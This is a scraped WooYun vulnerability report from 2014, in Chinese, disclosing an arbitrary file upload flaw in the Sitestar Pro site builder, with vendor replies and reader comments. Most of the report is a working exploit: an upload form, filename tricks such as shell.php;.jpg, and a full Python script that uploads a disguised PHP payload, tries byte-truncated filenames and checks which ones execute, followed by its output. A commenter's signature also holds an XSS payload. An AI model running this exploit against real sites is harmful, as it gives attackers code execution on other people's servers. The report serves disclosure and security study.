{"id": 5060, "wybug_id": "wooyun-2014-048293", "wybug_title": "建站之星模糊测试实战之任意文件上传漏洞", "wybug_corp": "建站之星", "wybug_author": "felixk3y", "wybug_date": "2014-01-08 17:09", "wybug_open_date": "2014-04-05 17:09", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传漏洞", "任意", "解析漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向公众公开  简要描述： GOOGLE翻来翻去 #$%^&^&* Q：只能通过\"%00\"、\"?\"、\"///////////....//////\"才能截断? 是真的吗? A: 答案是肯定的：NO!NO!NO!只有实践才能出真知!GO... 详细说明：  #1 Sitestar美橙互联又一力作,建站之星专业版(Sitestar Pro)，无拘无束,信手拈来,创意无限，不拘一格,轻松创建属于您自己的网站！#2 漏洞的产生/module/mod_tool.php 第89行起，img_create()函数\npublic function img_create() {\t\t$file_info =& ParamHolder::get('img_name', array(), PS_FILES);\t\tif ($file_info['error'] > 0) {\t\t\tNotice::set('mod_marquee/msg', __('Invalid post file data!'));\t\t\tContent::redirect(Html::uriquery('mod_tool', 'upload_img'));\t\t}\t\t//exit($file_info[\"name\"]);\t\tif(!preg_match('/\\.('.PIC_ALLOW_EXT.')$/i', $file_info[\"name\"])) {\t\t\t//echo '2222';\t\t\tNotice::set('mod_marquee/msg', __('File type error!'));\t\t\tContent::redirect(Html::uriquery('mod_marquee', 'upload_img'));\t\t}\t\tif(file_exists(ROOT.'/upload/image/'.$file_info[\"name\"])) {\t\t\t$file_info[\"name\"] = Toolkit::randomStr(8).strrchr($file_info[\"name\"],\".\");\t\t}\t\tif (!$this->_savelinkimg($file_info)) {\t\t\tNotice::set('mod_marquee/msg', __('Link image upload failed!'));\t\t\tContent::redirect(Html::uriquery('mod_marquee', 'upload_img'));\t\t}\n上述关键的代码\nif(!preg_match('/\\.('.PIC_ALLOW_EXT.')$/i', $file_info[\"name\"])) {\t\t\tNotice::set('mod_marquee/msg', __('File type error!'));\t\t\tContent::redirect(Html::uriquery('mod_marquee', 'upload_img'));\t\t}\n其中 PIC_ALLOW_EXT 为 gif|jpg|png|bmp 即如果文件名最后不是gif|jpg|png|bmp,则提示文件类型错误我们继续往下看...\nif (!$this->_savelinkimg($file_info)) {\t\t\tNotice::set('mod_marquee/msg', __('Link image upload failed!'));\t\t\tContent::redirect(Html::uriquery('mod_marquee', 'upload_img'));\t\t}\n跟进_savelinkimg函数 736行-741行\nprivate function _savelinkimg($struct_file) {\t\t$struct_file['name'] = iconv(\"UTF-8\", \"gb2312\", $struct_file['name']);\t\techo $struct_file['name'];\t\tmove_uploaded_file($struct_file['tmp_name'], ROOT.'/upload/image/'.$struct_file['name']);\t\treturn ParamParser::fire_virus(ROOT.'/upload/image/'.$struct_file['name']);\t}\n其中我们关心的是move_uploaded_file函数\nmove_uploaded_file($struct_file['tmp_name'], ROOT.'/upload/image/'.$struct_file['name']);\n看见没有,直接用我们上传的的文件名作为最终写进硬盘的文件名到这里，我们可以简单对其进行利用上传类似如下文件：shell.php;.jpg 或shell.php.a;.jpg 利用解析漏洞即可利用，但这并不是我们今天所要讲的内容,SO 继续.... #3 尝试漏洞利用既然文件名是我们上传的文件名，那我们用截断上传试试呢...首先我们尝试最最最常用的截断方法: %00为方便调试，我们加入调试代码\nif(!preg_match('/\\.('.PIC_ALLOW_EXT.')$/i', $file_info[\"name\"])) {\t\t\texit(\"Error,不能截断.\");//调试代码\t\t\tNotice::set('mod_marquee/msg', __('File type error!'));\t\t\tContent::redirect(Html::uriquery('mod_marquee', 'upload_img'));\t\t}\n同时将如下代码保持为sitestar.htm\n<form id=\"Upload\" enctype=\"multipart/form-data\" action=\"http://www.vulns.org/sitestar/index.php?_m=mod_tool&_a=img_create\" method=\"post\">  <input type=\"file\" name=\"img_name\" id=\"img_id\" size=\"50\">  <input id=\"btnUpload\" type=\"submit\" value=\"Upload\"></form>\n打开sitestar.htm，Burpsuite抓包 采用%00截断：\n\n输出了我们的调试代码\n\n看见了吧，不能成功的被截断,那我们是不是就到此为止了呢? 显然 答案是NO！额 ！！想起来了...我们都知道Fuzzing很强大... SO 继续吧...   漏洞证明：  #4 Fuzzing成功利用丢一真理：实践出真知,各位看官们 眼睛睁大了...为了能Fuzzing,看来还得码代码啊,首先抓个上传的包,方便代码中用这里我们用py写Fuzzing的代码，好吧 我已经给各位写好啦\n#D:\\Python27\\python.exe#coding = utf-8import osimport reimport sysimport randomimport urllib2import urllibdef hex_to_asc(ch):    return '{:c}'.format(int(float.fromhex(ch)))def rand5str(num):    sts = ''    char = '1234567890abcdexyz'    for i in range(num):        sts += random.choice(char)    return stsdef postdata(strr):    global sname    sname = rand5str(8)    data = '------WebKitFormBoundaryFz8xcpseXipPJz6Q\\r\\n'    data +='Content-Disposition: form-data; name=\"img_name\"; filename=\"%s.php%s;a.gif\"\\r\\n' % (sname,strr)    data +='Content-Type: image/gif\\r\\n'    data +='\\r\\n'    data +='GIF89a<script language=\\'php\\'>\\r\\n'    data +='phpinfo();\\r\\n'    data +='------WebKitFormBoundaryFz8xcpseXipPJz6Q--\\r\\n'    return datadef Fuzzing(mstr,url,cookie):    posturl  = \"%s/sitestar/index.php?_m=mod_tool&_a=img_create\" % url    headers  = {        'User-Agent' : 'Googlebot/2.1 (+http://www.google.com/bot.html)',  \t'Content-Type' : 'multipart/form-data; boundary=----WebKitFormBoundaryFz8xcpseXipPJz6Q',\t'Cookie': cookie    }    hexstr   = hex_to_asc(mstr)    posts    = postdata(hexstr)    request  = urllib2.Request(posturl, posts, headers)    response = urllib2.urlopen(request)    htmls    = response.read()    response.close()        fuzzurl = \"%s/sitestar/upload/image/%s.php\" % (url,sname)    try:        resp = urllib2.urlopen(fuzzurl)        html = resp.read()        reg  = re.search(r'<style type=\"text/css\">',html)        if reg is not None:            print '%%%s is --> OK..' % mstr    except:        print '%%%s is -> No..' % mstrif __name__==\"__main__\":    if len(sys.argv)<4:        print '\\n  sitestar_upload.py -u <url> -c <cookie>'        os._exit(0)    url = sys.argv[2]    cookie = sys.argv[4]    if 'http://' not in url:        url = 'http://%s'%url        for i in range(100):        s = '%02d' % i        Fuzzing(s,url,cookie)\n#5 Fuzzing动起来step1 首先注册个用户名step2 登陆后 抓下Cookiestep3 打开CMD，哈哈...我们的cookie如下\nRya5_2132_ulastactivity=f6159i9gE3RqKLgf5IFeEYMgRbch8XHcq8L9yjKdgdcklNzyHcuG; sYQDUGqqzHsearch_history=dd%7C3; CNZZDATA1754403=cnzz_eid%3D239727152-1385000911-http%253A%252F%252Fwww.vulns.org%26ntime%3D1385000911%26cnzz_a%3D12%26sin%3Dhttp%253A%252F%252Fwww.vulns.org%253A81%252Fgover1%252FSearch.asp%26ltime%3D1385000907409; _cnzz_CV=; language=zh-cn; A29_visitedfid=2; smile=1D1; YlsN_2132_saltkey=BCq0w3j3; YlsN_2132_lastvisit=1386810963; YlsN_2132_visitedfid=2; YlsN_2132_lastcheckfeed=1%7C1386898405; YlsN_2132_editormode_e=1; YlsN_2132_smile=1D1; K5PL3_uid=1; K5PL3_hash=0a4d70e0; YlsN_2132_ulastactivity=e35dE3Tw1Tk%2B%2B9ATPf1vuCQDDPhyih4eFcdTHjOURWXVg8tD0n%2Br; rRex_2132_saltkey=3w13193y; rRex_2132_lastvisit=1388735738; rRex_2132_ulastactivity=6b208R0hVUACRQvTjn7En9kDuyvN7ZNRftXROrgtEy6kLy8zzU4j; _mkto_trk=id:797-ENI-742&token:_mch-vulns.org-1388719339154-91284; __ar_v4=DDRUVU4CRNEHLB3NYFC2PH%3A20140102%3A2%7C5PZND6KU6RD4RAHEGDPE5S%3A20140102%3A2%7CJIFJRAFWAJHHRE57MKUYU2%3A20140102%3A2; PHPSESSID=d413af28abd2a8fd38e670cbcca23ee4\n打开CMD Fuzzing 跑起来...\n%77 is -> No..%78 is -> No..%79 is -> No..%80 is --> OK..%81 is --> OK..%82 is --> OK..%83 is --> OK..%84 is --> OK..%85 is --> OK..%86 is --> OK..%87 is --> OK..%88 is --> OK..%89 is --> OK..%90 is --> OK..%91 is --> OK..%92 is --> OK..%93 is --> OK..%94 is --> OK..%95 is --> OK..%96 is --> OK..%97 is --> OK..%98 is --> OK..%99 is --> OK..\n看见了吧,%80 --- %99都可以截断\n\n生成的文件如图（路径：upload/image）\n\n看见了吧,shell.php 就躺在对方的硬盘里了... #6 Fuzzing成功\n\n#7 大家Fuzzing动起来吧...   修复方案：  不多说.   版权声明：转载请注明来源 felixk3y@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-04-05 17:09 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-08 17:16 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  空格不是也有的情况可以截断吗    \n     2014-01-08 17:21 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  洞主是受人之渔啊，鼓掌    \n     2014-01-08 17:26 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @wefgod 有时点(.)或空格( )可以,但这不是,要不然这个Fuzz就没意义了    \n     2014-01-08 17:30 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 果然是大牛哦    \n     2014-01-08 17:34 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  看来模糊测试没白读    \n     2014-01-08 17:40 |    \t\t剑无名 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:32        | 此剑无名。)\t\t \n  狠狠的mark    \n     2014-01-08 19:10 |    \t\t法海 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | 许仙去哪了)\t\t \n  关注    \n     2014-01-13 18:13 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @疯狗 居然忽略了? 什么情况    \n     2014-01-14 12:12 |    \t\t【|→上善若水】 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:25        | 【|→上善若水】)\t\t \n  @felixk3y 怎么忽略了?    \n     2014-01-14 15:56 |    \t\tGosuto \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | )\t\t \n  果断关注    \n     2014-01-14 20:07 |    \t\t建站之星(乌云厂商)\t\t \n  处理人员操作错误,已经确认相关流程.    \n     2014-01-14 21:02 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @建站之星 没事，赶紧修复了就行。    \n     2014-01-15 08:58 |    \t\t建站之星(乌云厂商)\t\t \n  @felixk3y 您提供的相关漏洞的补丁包在之前就已经发布了,您可以下载或者后台更新最新安全补丁包后再测试.    \n     2014-01-16 10:13 |    \t\t乌云合作伙伴-知道创宇(乌云厂商)\t\t \n  最好测试下linux、或者php版本之类的。    \n     2014-01-16 10:19 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @乌云合作伙伴-知道创宇 后来测试了,是windows特性,只在特定情况下才可以截断.    \n     2014-01-31 13:32 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  明白了。果然还是windows的特性啊。linux下不行吗？还有上面提到的php版本有木有关系？比如高版本的是否可以截断啊    \n     2014-02-19 19:32 |    \t\t【|→上善若水】 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:25        | 【|→上善若水】)\t\t \n  @felixk3y 姐姐，为啥你讲的这么清楚呢，这我都居然看懂了，为啥你不当面给我讲呢！    \n     2014-03-18 15:36 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  其实 用80来测试 是字符转换的原因导致的截断    \n     2014-05-14 16:27 |    \t\twusuopubupt \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | BUPTer, linux lover.)\t\t \n  牛！    \n     2014-05-16 09:08 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  fuzzing 真是强大    \n     2014-05-16 14:43 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  碉堡了，mark    \n     2014-06-06 09:50 |    \t\tspiderman \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 让安全来得更猛烈写吧)\t\t \n  楼主讲的很明白，高手！！！！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}